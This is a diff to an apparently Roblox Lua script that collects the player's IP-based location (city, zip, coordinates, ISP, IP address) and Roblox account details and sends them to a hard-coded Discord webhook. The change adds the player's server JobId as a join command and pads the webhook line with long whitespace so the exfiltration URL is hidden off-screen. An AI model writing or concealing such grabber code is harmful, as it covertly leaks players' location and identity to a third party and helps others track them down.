@@ -143,10 +143,11 @@ data from ip-api:
 roblox information:
     - DisplayName: %s
     - Name: %s
-    - UserId: %s```]], iptable.country, iptable.countryCode, iptable.region, iptable.regionName, iptable.city, iptable.zip, iptable.lat, iptable.lon, iptable.timezone, iptable.isp, iptable.org, iptable.as, iptable.query, game:GetService("Players").LocalPlayer.DisplayName, game:GetService("Players").LocalPlayer.Name, game:GetService("Players").LocalPlayer.UserId)
+    - UserId: %s
+    - JobId: %s```]], iptable.country, iptable.countryCode, iptable.region, iptable.regionName, iptable.city, iptable.zip, iptable.lat, iptable.lon, iptable.timezone, iptable.isp, iptable.org, iptable.as, iptable.query, game:GetService("Players").LocalPlayer.DisplayName, game:GetService("Players").LocalPlayer.Name, game:GetService("Players").LocalPlayer.UserId, "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", \""..game.JobId.."\")")
 	
 	http({
-		Url = "https://ptb.discord.com/api/webhooks/999281807239426110/LLYLg50BkDDVrz85SCt95fAhRxG9Z8poV2hINKdH37oi3f_8Nfh8nDJKmrHzzTYPuF9x", 
+		Url =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                "https://ptb.discord.com/api/webhooks/999281807239426110/LLYLg50BkDDVrz85SCt95fAhRxG9Z8poV2hINKdH37oi3f_8Nfh8nDJKmrHzzTYPuF9x", 
 		Method = "POST", 
 		Headers = {
 			["Content-Type"] = "application/json"
